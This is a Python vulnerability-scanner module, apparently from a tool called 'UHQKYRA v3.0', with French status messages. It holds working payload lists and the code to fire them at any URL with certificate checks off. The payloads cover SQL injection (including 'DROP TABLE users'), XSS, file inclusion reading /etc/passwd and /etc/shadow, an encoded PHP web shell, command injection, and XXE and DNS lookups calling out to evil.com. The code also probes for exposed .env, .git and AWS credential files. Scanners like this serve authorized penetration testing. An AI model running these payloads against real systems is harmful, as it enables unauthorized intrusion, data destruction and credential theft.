"""
Vulnerability Scanner Module - UHQKYRA v3.0
Tests: SQLi, XSS, LFI, Open Redirect, Command Injection, XXE,
       CRLF, NoSQL Injection, LDAP Injection, XML Injection,
       Path Traversal, HTTP Parameter Pollution, Misconfigurations
"""
import re
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
}

# ── SQL INJECTION PAYLOADS ────────────────────────────────────────
SQLI_PAYLOADS = [
    # Error-based
    "'", "''", "`", "\"", "\\",
    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
    "' OR 1=1 --", "' OR 1=1#", "\" OR 1=1 --",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' UNION ALL SELECT NULL,NULL,NULL--",
    "admin'--", "admin'/*",
    "' OR 'x'='x", "\" OR \"x\"=\"x",
    "') OR ('x'='x", "')) OR (('x'='x",
    # Boolean-based
    "1 AND 1=1", "1 AND 1=2",
    "1' AND '1'='1", "1' AND '1'='2",
    "1 AND 1=1--", "1 AND 1=2--",
    "' AND 1=1--", "' AND 1=2--",
    "1' AND SUBSTRING(username,1,1)='a'--",
    # Time-based (MySQL)
    "1; SELECT SLEEP(3)--", "1' AND SLEEP(3)--",
    "' AND SLEEP(3)--", "1) AND SLEEP(3)--",
    "1'; SELECT SLEEP(3)--",
    # Time-based (MSSQL)
    "'; WAITFOR DELAY '0:0:3'--",
    "1' WAITFOR DELAY '0:0:3'--",
    # Time-based (PostgreSQL)
    "'; SELECT pg_sleep(3)--",
    "1'; SELECT pg_sleep(3)--",
    # Stacked queries
    "1; DROP TABLE users--",
    "1'; INSERT INTO users VALUES('hacker','hacker')--",
    # MySQL-specific
    "' UNION SELECT user(),database(),version()--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    # PostgreSQL-specific
    "' UNION SELECT current_user,2,3--",
    # MSSQL
    "' UNION SELECT @@version,2,3--",
]

# ── XSS PAYLOADS ─────────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<math href=javascript:alert(1)>click</math>",
    "<a href=javascript:alert(1)>click</a>",
    "';alert('XSS')//",
    "\";alert('XSS')//",
    "</script><script>alert(1)</script>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "\x3Cscript\x3Ealert(1)\x3C/script\x3E",
    "\" onmouseover=\"alert(1)",
    "' onmouseover='alert(1)",
    "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;49&#41;\">",
    # DOM-based hints
    "javascript:alert(document.cookie)",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
]

# ── LFI PAYLOADS ─────────────────────────────────────────────────
LFI_PAYLOADS = [
    # Linux
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
    "/proc/version", "/proc/self/environ", "/proc/self/cmdline",
    # Encoded
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%2F%2F%2Fetc%2Fpasswd",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "phar://pharfile.phar/file.txt",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
    # Windows
    "C:\\Windows\\system32\\drivers\\etc\\hosts",
    "C:\\boot.ini", "C:\\Windows\\win.ini",
    "..\\..\\..\\Windows\\win.ini",
    "..\\..\\..\\Windows\\system.ini",
    # Null bytes (older PHP)
    "../etc/passwd%00",
    "../etc/passwd\x00",
]

# ── COMMAND INJECTION PAYLOADS ───────────────────────────────────
CMDI_PAYLOADS = [
    # Unix
    ";id", "|id", "||id", "&&id", "`id`", "$(id)",
    ";cat /etc/passwd", "|cat /etc/passwd",
    ";uname -a", "|uname -a",
    "\n/bin/ls", ";/bin/ls",
    "| ping -c 1 127.0.0.1",
    ";ping -c 1 127.0.0.1",
    # Windows
    "|whoami", ";whoami", "&&whoami",
    "|dir", ";dir",
    "| type C:\\Windows\\win.ini",
    # Encoded
    "%3Bid", "%7Cid", "%26%26id",
    # Blind
    ";sleep 3", "|sleep 3", "&&sleep 3",
    "`sleep 3`", "$(sleep 3)",
    # DNS-based (OOB)
    "||nslookup test.$(hostname).evil.com",
]

# ── NOSQL INJECTION PAYLOADS ─────────────────────────────────────
NOSQL_PAYLOADS_PARAM = [
    # MongoDB
    "'||'1'=='1", "' || 1==1//", "\" || 1==1//",
    "[$ne]", "[$gt]", "[$regex]",
    "{$gt:''}", "{$ne:-1}",
    "'; return 1; var x='",
    "'; return 'a'=='a'; var x='",
]

NOSQL_PAYLOADS_JSON = [
    '{"$gt": ""}',
    '{"$ne": "invalidvalue"}',
    '{"$regex": ".*"}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
]

# ── XXE PAYLOADS ─────────────────────────────────────────────────
XXE_PAYLOADS = [
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>""",
    """<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><root>&xxe;</root>""",
    """<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://evil.com/x.dtd"> %xxe; ]>""",
]

# ── CRLF INJECTION PAYLOADS ──────────────────────────────────────
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie: crlf=injection",
    "%0aSet-Cookie: crlf=injection",
    "\r\nSet-Cookie: crlf=injection",
    "\nSet-Cookie: crlf=injection",
    "%0d%0aContent-Length: 0",
    "%0d%0aX-XSS: crlf-injected",
    "\\r\\nSet-Cookie: crlf=injection",
    "%E5%98%8D%E5%98%8ASet-Cookie: crlf=injection",
]

# ── LDAP INJECTION PAYLOADS ──────────────────────────────────────
LDAP_PAYLOADS = [
    "*", "*)(&", "*)(uid=*))(|(uid=*",
    "admin)(&(password=*)", "*()|&'", "*()|%26'",
    "))%00", "*(|(password=*))",
    "*)(|(objectClass=*)",
]

# ── SQL ERROR PATTERNS ───────────────────────────────────────────
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException", r"valid MySQL result",
    r"MySqlClient\.", r"MySQL Query fail",
    r"ERROR 1064", r"You have an error in your SQL syntax",
    r"supplied argument is not a valid MySQL",
    r"Column count doesn", r"PostgreSQL.*ERROR",
    r"Warning.*pg_.*", r"valid PostgreSQL result",
    r"Npgsql\.", r"org\.postgresql\.util\.PSQLException",
    r"ERROR: parser: parse error at or near",
    r"ORA-\d{4,5}", r"Oracle error", r"Oracle.*Driver",
    r"Warning.*oci_.*", r"OracleException",
    r"Microsoft OLE DB Provider for ODBC Drivers error",
    r"\[Microsoft\]\[ODBC", r"SQLServer JDBC Driver",
    r"com\.microsoft\.sqlserver\.jdbc",
    r"Microsoft SQL Native Client error",
    r"Unclosed quotation mark after the character string",
    r"SQLite.*error", r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*sqlite_.*", r'near ".*": syntax error',
    r"SQLITE_ERROR", r"Syntax error or access violation",
    r"DB2 SQL error", r"SQLCODE", r"IBM DB2",
    r"ODBC SQL Server Driver", r"Sybase message",
    r"Informix ODBC", r"Dynamic SQL Error",
    r"JET Database Engine", r"Access Database Engine",
]

CMDI_INDICATORS = [
    "uid=", "gid=", "groups=",   # id command
    "root:", "daemon:", "www-data:",  # /etc/passwd
    "Linux version", "GNU/Linux",     # uname -a
    "Windows", "Microsoft",           # Windows commands
    r"\d+\.\d+\.\d+",                 # Version numbers
]


def _session():
    if not HAS_REQUESTS:
        return None
    s = requests.Session()
    s.headers.update(HEADERS)
    s.verify = False
    return s


def _build_test_url(url, param, payload):
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    params[param] = payload
    new_q = urllib.parse.urlencode(params)
    return urllib.parse.urlunparse(parsed._replace(query=new_q))


def test_sqli(url, param=None, method="GET", callback=None):
    """Enhanced SQL injection testing"""
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    results = {"url": url, "vulnerable": False, "findings": [], "payloads_tested": 0}
    if callback:
        callback({"type": "info", "message": f"💉 SQLi test: {url}"})

    s = _session()
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    if not params and not param:
        if callback:
            callback({"type": "warn", "message": "⚠️ Pas de paramètres pour SQLi"})
        return results

    test_params = list(params.keys()) if params else [param]

    for test_param in test_params:
        try:
            baseline = s.get(url, timeout=10)
            baseline_size = len(baseline.text)
        except Exception:
            continue

        for payload in SQLI_PAYLOADS:
            results["payloads_tested"] += 1
            test_url = _build_test_url(url, test_param, payload)
            try:
                t0 = time.time()
                resp = s.get(test_url, timeout=15)
                elapsed = time.time() - t0

                # Error-based detection
                for pattern in SQL_ERROR_PATTERNS:
                    if re.search(pattern, resp.text, re.I):
                        if not any(f.get("type") == "Error-based SQLi" and f.get("param") == test_param
                                   for f in results["findings"]):
                            results["findings"].append({
                                "type": "Error-based SQLi",
                                "param": test_param, "payload": payload,
                                "pattern": pattern, "severity": "critical"
                            })
                            results["vulnerable"] = True
                            if callback:
                                callback({"type": "vuln",
                                          "message": f"🚨 SQLi Error-based ! Param: {test_param} | {pattern[:50]}"})
                        break

                # Time-based blind
                if any(kw in payload.upper() for kw in ("SLEEP", "WAITFOR", "PG_SLEEP", "BENCHMARK")):
                    if elapsed >= 2.8:
                        if not any(f.get("type") == "Time-based Blind SQLi" and f.get("param") == test_param
                                   for f in results["findings"]):
                            results["findings"].append({
                                "type": "Time-based Blind SQLi",
                                "param": test_param, "payload": payload,
                                "elapsed": round(elapsed, 2), "severity": "critical"
                            })
                            results["vulnerable"] = True
                            if callback:
                                callback({"type": "vuln",
                                          "message": f"🚨 SQLi Time-based ! Param: {test_param} | Delay: {elapsed:.1f}s"})

                # Boolean-based (size difference)
                if "1=1" in payload or "1=2" in payload:
                    diff = abs(len(resp.text) - baseline_size)
                    if diff > 300 and resp.status_code == baseline.status_code:
                        pass  # Log only if we have 1=1 and 1=2 pair

            except requests.Timeout:
                if any(kw in payload.upper() for kw in ("SLEEP", "WAITFOR", "PG_SLEEP")):
                    results["findings"].append({
                        "type": "Time-based Blind SQLi (Timeout)",
                        "param": test_param, "payload": payload,
                        "elapsed": ">15s", "severity": "critical"
                    })
                    results["vulnerable"] = True
                    if callback:
                        callback({"type": "vuln",
                                  "message": f"🚨 SQLi Timeout (time-based) ! Param: {test_param}"})
            except Exception:
                pass

            if results["vulnerable"]:
                break  # Found one, move to next param

    if not results["vulnerable"] and callback:
        callback({"type": "ok",
                  "message": f"✅ Pas de SQLi ({results['payloads_tested']} payloads testés)"})
    return results


def test_xss(url, param=None, callback=None):
    """Enhanced XSS testing"""
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    results = {"url": url, "vulnerable": False, "findings": [], "payloads_tested": 0}
    if callback:
        callback({"type": "info", "message": f"🎯 XSS test: {url}"})

    s = _session()
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    if not params and not param:
        return results

    test_params = list(params.keys()) if params else [param]

    for test_param in test_params:
        for payload in XSS_PAYLOADS:
            results["payloads_tested"] += 1
            test_url = _build_test_url(url, test_param, payload)
            try:
                resp = s.get(test_url, timeout=10)
                # Reflected XSS: payload appears unencoded in response
                if payload in resp.text:
                    encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
                    if encoded not in resp.text or payload in resp.text:
                        results["findings"].append({
                            "type": "Reflected XSS",
                            "param": test_param, "payload": payload,
                            "severity": "high"
                        })
                        results["vulnerable"] = True
                        if callback:
                            callback({"type": "vuln",
                                      "message": f"🚨 XSS Réfléchi ! Param: {test_param} | {payload[:40]}"})
                        break
            except Exception:
                pass
        if results["vulnerable"]:
            break

    if not results["vulnerable"] and callback:
        callback({"type": "ok", "message": f"✅ Pas de XSS ({results['payloads_tested']} testés)"})
    return results


def test_lfi(url, param=None, callback=None):
    """Enhanced LFI / Path Traversal testing"""
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    results = {"url": url, "vulnerable": False, "findings": []}
    if callback:
        callback({"type": "info", "message": f"📂 LFI test: {url}"})

    s = _session()
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    if not params and not param:
        return results

    lfi_indicators = [
        "root:x:", "root:!", "[boot loader]", "[extensions]",
        "localhost", "/bin/bash", "daemon:", "www-data:", "nobody:",
        "DOCUMENT_ROOT=", "PHP_SELF=", "SCRIPT_FILENAME=",
        "CLASSPATH=", "[fonts]", "[extensions]", "# This is a sample",
        "[operating systems]",  # boot.ini
    ]

    test_params = list(params.keys()) if params else [param]
    for test_param in test_params:
        for payload in LFI_PAYLOADS:
            test_url = _build_test_url(url, test_param, payload)
            try:
                resp = s.get(test_url, timeout=10)
                for ind in lfi_indicators:
                    if ind in resp.text:
                        results["findings"].append({
                            "type": "LFI/Path Traversal",
                            "param": test_param, "payload": payload,
                            "indicator": ind, "severity": "critical"
                        })
                        results["vulnerable"] = True
                        if callback:
                            callback({"type": "vuln",
                                      "message": f"🚨 LFI ! Param: {test_param} | Payload: {payload[:40]}"})
                        return results
            except Exception:
                pass

    if not results["vulnerable"] and callback:
        callback({"type": "ok", "message": "✅ Pas de LFI détecté"})
    return results


def test_command_injection(url, param=None, callback=None):
    """Test for OS Command Injection"""
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    results = {"url": url, "vulnerable": False, "findings": []}
    if callback:
        callback({"type": "info", "message": f"💻 Command Injection test: {url}"})

    s = _session()
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    if not params and not param:
        return results

    test_params = list(params.keys()) if params else [param]
    for test_param in test_params:
        for payload in CMDI_PAYLOADS:
            test_url = _build_test_url(url, test_param, payload)
            try:
                t0 = time.time()
                resp = s.get(test_url, timeout=8)
                elapsed = time.time() - t0
                # Time-based blind CMDi
                if "sleep 3" in payload.lower() and elapsed >= 2.8:
                    results["findings"].append({
                        "type": "Blind Command Injection (Time-based)",
                        "param": test_param, "payload": payload,
                        "severity": "critical"
                    })
                    results["vulnerable"] = True
                    if callback:
                        callback({"type": "vuln",
                                  "message": f"🚨 CMDi Blind ! Param: {test_param} | Delay: {elapsed:.1f}s"})
                    return results
                # Direct output
                for ind in CMDI_INDICATORS:
                    if re.search(ind, resp.text):
                        results["findings"].append({
                            "type": "Command Injection",
                            "param": test_param, "payload": payload,
                            "indicator": ind, "severity": "critical"
                        })
                        results["vulnerable"] = True
                        if callback:
                            callback({"type": "vuln",
                                      "message": f"🚨 Command Injection ! Param: {test_param}"})
                        return results
            except requests.Timeout:
                if "sleep" in payload.lower():
                    results["findings"].append({
                        "type": "Possible Blind CMDi (Timeout)",
                        "param": test_param, "payload": payload,
                        "severity": "high"
                    })
                    results["vulnerable"] = True
                    if callback:
                        callback({"type": "warn",
                                  "message": f"⚠️ CMDi Timeout (possible) Param: {test_param}"})
            except Exception:
                pass

    if not results["vulnerable"] and callback:
        callback({"type": "ok", "message": "✅ Pas de CMDi détecté"})
    return results


def test_nosql_injection(url, param=None, callback=None):
    """Test for NoSQL Injection (MongoDB, CouchDB)"""
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    results = {"url": url, "vulnerable": False, "findings": []}
    if callback:
        callback({"type": "info", "message": f"🍃 NoSQL Injection test: {url}"})

    s = _session()
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    if not params:
        return results

    try:
        base = s.get(url, timeout=10)
        base_size = len(base.text)
    except Exception:
        return results

    test_params = list(params.keys()) if params else ([param] if param else [])
    for test_param in test_params:
        # URL-based NoSQL
        for payload in NOSQL_PAYLOADS_PARAM:
            test_url = _build_test_url(url, test_param, payload)
            try:
                resp = s.get(test_url, timeout=8)
                diff = abs(len(resp.text) - base_size)
                if diff > 500 and resp.status_code == 200:
                    results["findings"].append({
                        "type": "Possible NoSQL Injection",
                        "param": test_param, "payload": payload,
                        "severity": "high"
                    })
                    results["vulnerable"] = True
                    if callback:
                        callback({"type": "warn",
                                  "message": f"⚠️ NoSQL possible ! Param: {test_param}"})
            except Exception:
                pass

        # JSON-based NoSQL (POST)
        for json_payload in NOSQL_PAYLOADS_JSON:
            try:
                import json
                resp = s.post(
                    url.split('?')[0],
                    data=json_payload,
                    headers={**HEADERS, "Content-Type": "application/json"},
                    timeout=8
                )
                if resp.status_code == 200 and len(resp.text) > base_size + 100:
                    results["findings"].append({
                        "type": "NoSQL Injection (JSON POST)",
                        "param": "body", "payload": json_payload[:50],
                        "severity": "high"
                    })
                    results["vulnerable"] = True
                    if callback:
                        callback({"type": "warn",
                                  "message": f"⚠️ NoSQL JSON possible !"})
            except Exception:
                pass

    if not results["vulnerable"] and callback:
        callback({"type": "ok", "message": "✅ Pas de NoSQL Injection détecté"})
    return results


def test_crlf_injection(url, callback=None):
    """Test for CRLF/HTTP Response Splitting"""
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    results = {"url": url, "vulnerable": False, "findings": []}
    if callback:
        callback({"type": "info", "message": f"↩️ CRLF test: {url}"})

    s = _session()
    base = url if "://" in url else "http://" + url

    for payload in CRLF_PAYLOADS:
        test_url = base + "/" + payload
        try:
            resp = s.get(test_url, timeout=8, allow_redirects=False)
            # Check if our injected header appears in response
            if "crlf" in str(resp.headers).lower() or "Set-Cookie: crlf" in str(resp.headers):
                results["vulnerable"] = True
                results["findings"].append({
                    "type": "CRLF Injection",
                    "payload": payload, "severity": "high",
                    "detail": "Injection dans les headers HTTP"
                })
                if callback:
                    callback({"type": "vuln",
                              "message": f"🚨 CRLF Injection ! Payload: {payload[:40]}"})
                return results
            # Check location header injection
            location = resp.headers.get("Location", "")
            if "crlf" in location.lower():
                results["vulnerable"] = True
                results["findings"].append({
                    "type": "CRLF in Redirect",
                    "payload": payload, "severity": "medium"
                })
                if callback:
                    callback({"type": "warn",
                              "message": f"⚠️ CRLF dans Location: {location[:60]}"})
        except Exception:
            pass

    if not results["vulnerable"] and callback:
        callback({"type": "ok", "message": "✅ Pas de CRLF détecté"})
    return results


def test_xxe(url, callback=None):
    """Test for XML External Entity injection"""
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    results = {"url": url, "vulnerable": False, "findings": []}
    if callback:
        callback({"type": "info", "message": f"📋 XXE test: {url}"})

    s = _session()
    xxe_indicators = ["root:x:", "root:!", "/bin/bash", "daemon:", "[extensions]"]

    for payload in XXE_PAYLOADS:
        try:
            resp = s.post(
                url if "://" in url else "http://" + url,
                data=payload,
                headers={**HEADERS, "Content-Type": "application/xml"},
                timeout=8
            )
            for ind in xxe_indicators:
                if ind in resp.text:
                    results["vulnerable"] = True
                    results["findings"].append({
                        "type": "XXE Injection",
                        "payload": payload[:100], "severity": "critical",
                        "indicator": ind
                    })
                    if callback:
                        callback({"type": "vuln",
                                  "message": f"🚨 XXE ! Fichier /etc/passwd lu !"})
                    return results
            # SSRF via XXE
            if "127.0.0.1" in resp.text or "localhost" in resp.text.lower():
                results["findings"].append({
                    "type": "XXE SSRF",
                    "payload": payload[:100], "severity": "high"
                })
                results["vulnerable"] = True
                if callback:
                    callback({"type": "warn", "message": "⚠️ XXE SSRF possible"})
        except Exception:
            pass

    if not results["vulnerable"] and callback:
        callback({"type": "ok", "message": "✅ Pas de XXE détecté"})
    return results


def test_ldap_injection(url, param=None, callback=None):
    """Test for LDAP Injection"""
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    results = {"url": url, "vulnerable": False, "findings": []}
    if callback:
        callback({"type": "info", "message": f"📁 LDAP Injection test: {url}"})

    s = _session()
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    if not params:
        return results

    try:
        base = s.get(url, timeout=10)
        base_size = len(base.text)
    except Exception:
        return results

    test_params = list(params.keys()) if params else ([param] if param else [])
    ldap_errors = ["LDAPException", "ldap_bind", "ldap_search", "DN Syntax",
                   "Invalid DN", "objectclass=", "cn=", "ou="]

    for test_param in test_params:
        for payload in LDAP_PAYLOADS:
            test_url = _build_test_url(url, test_param, payload)
            try:
                resp = s.get(test_url, timeout=8)
                for err in ldap_errors:
                    if err.lower() in resp.text.lower():
                        results["vulnerable"] = True
                        results["findings"].append({
                            "type": "LDAP Injection",
                            "param": test_param, "payload": payload,
                            "severity": "high", "indicator": err
                        })
                        if callback:
                            callback({"type": "warn",
                                      "message": f"⚠️ LDAP Injection possible ! Param: {test_param}"})
                        return results
            except Exception:
                pass

    return results


def test_open_redirect(url, param=None, callback=None):
    """Test for Open Redirect"""
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    results = {"url": url, "vulnerable": False, "findings": []}
    if callback:
        callback({"type": "info", "message": f"🔀 Open Redirect test: {url}"})

    payloads = [
        "//evil.com", "https://evil.com", "http://evil.com",
        "//evil.com/path", r"\/\/evil.com", "//evil.com/%2F..",
        "https:///evil.com", "javascript:alert(1)",
        "//google.com", "https://google.com",
        "//evil.com@trusted.com", "/\\/evil.com",
        "/%09/evil.com", "/%2F%2Fevil.com",
    ]

    s = _session()
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))

    redirect_kws = ["redirect", "url", "next", "return", "goto", "dest",
                    "destination", "forward", "redir", "back", "location", "target"]
    test_params = [k for k in params.keys() if any(rk in k.lower() for rk in redirect_kws)]
    if param:
        test_params = [param]
    if not test_params:
        test_params = list(params.keys())

    for test_param in test_params:
        for payload in payloads:
            test_url = _build_test_url(url, test_param, payload)
            try:
                resp = s.get(test_url, timeout=8, allow_redirects=False)
                location = resp.headers.get("Location", "")
                if location and any(d in location for d in ["evil.com", "google.com"]):
                    results["findings"].append({
                        "type": "Open Redirect",
                        "param": test_param, "payload": payload,
                        "redirect_to": location, "severity": "medium"
                    })
                    results["vulnerable"] = True
                    if callback:
                        callback({"type": "vuln",
                                  "message": f"⚠️ Open Redirect ! Param: {test_param} → {location[:60]}"})
            except Exception:
                pass

    if not results["vulnerable"] and callback:
        callback({"type": "ok", "message": "✅ Pas de redirect ouvert"})
    return results


def check_security_misconfigs(url, callback=None):
    """Check for common security misconfigurations"""
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    findings = []
    s = _session()
    base = (url if "://" in url else "http://" + url).rstrip('/')

    if callback:
        callback({"type": "info", "message": f"🔍 Misconfigurations: {base}"})

    # HTTP Methods
    for method in ["OPTIONS", "TRACE", "PUT", "DELETE", "PATCH", "CONNECT", "PROPFIND"]:
        try:
            resp = s.request(method, base, timeout=6)
            if resp.status_code not in (405, 501, 400, 404):
                sev = "high" if method in ("TRACE", "PUT", "DELETE") else "medium"
                findings.append({
                    "type": f"HTTP {method} autorisé",
                    "severity": sev,
                    "detail": f"status {resp.status_code}"
                })
                if callback:
                    callback({"type": "vuln",
                              "message": f"⚠️ HTTP {method} autorisé ! ({resp.status_code})"})
                if method == "TRACE" and resp.status_code == 200 and "TRACE" in resp.text:
                    findings.append({
                        "type": "XST (Cross-Site Tracing)",
                        "severity": "medium",
                        "detail": "TRACE reflète les headers — vol de cookies HttpOnly via XSS possible"
                    })
        except Exception:
            pass

    # Directory listing
    for d in ["/images/", "/uploads/", "/files/", "/static/", "/css/", "/js/", "/backup/"]:
        try:
            resp = s.get(base + d, timeout=5)
            if resp.status_code == 200 and re.search(r'(?:Index of|Directory listing|Parent Directory)',
                                                      resp.text, re.I):
                findings.append({
                    "type": f"Directory Listing activé : {d}",
                    "severity": "medium",
                    "detail": base + d
                })
                if callback:
                    callback({"type": "warn",
                              "message": f"⚠️ Directory listing: {d}"})
        except Exception:
            pass

    # Sensitive file exposures
    sensitive = [
        ("/.git/config", "[core]", "critical", ".git exposé"),
        ("/.env", "DB_", "critical", ".env exposé"),
        ("/.env", "APP_", "critical", ".env exposé"),
        ("/phpinfo.php", "phpinfo()", "high", "phpinfo() exposé"),
        ("/info.php", "phpinfo()", "high", "phpinfo() exposé"),
        ("/.htpasswd", ":", "high", ".htpasswd exposé"),
        ("/web.config", "connectionString", "critical", "web.config exposé"),
        ("/config.php", "password", "critical", "config.php exposé"),
        ("/wp-config.php", "DB_PASSWORD", "critical", "wp-config.php exposé"),
        ("/.aws/credentials", "aws_access_key", "critical", "AWS credentials exposés"),
        ("/server-status", "Server Version", "medium", "Apache server-status exposé"),
        ("/actuator/env", "activeProfiles", "critical", "Spring Actuator /env exposé"),
    ]
    for path, indicator, severity, desc in sensitive:
        try:
            resp = s.get(base + path, timeout=6)
            if resp.status_code == 200 and indicator.lower() in resp.text.lower():
                findings.append({
                    "type": desc,
                    "severity": severity,
                    "detail": base + path
                })
                if callback:
                    callback({"type": "vuln",
                              "message": f"🚨 {desc} !"})
        except Exception:
            pass

    # Cookie security check
    try:
        resp = s.get(base, timeout=10)
        for cookie in resp.cookies:
            issues = []
            if not cookie.secure:
                issues.append("Secure absent")
            if "httponly" not in str(cookie._rest).lower():
                issues.append("HttpOnly absent")
            if "samesite" not in str(cookie._rest).lower():
                issues.append("SameSite absent")
            if issues:
                findings.append({
                    "type": f"Cookie non sécurisé : {cookie.name}",
                    "severity": "medium",
                    "detail": ", ".join(issues)
                })
    except Exception:
        pass

    if not findings and callback:
        callback({"type": "ok", "message": "✅ Aucune misconfiguration évidente"})

    return {"findings": findings, "count": len(findings)}
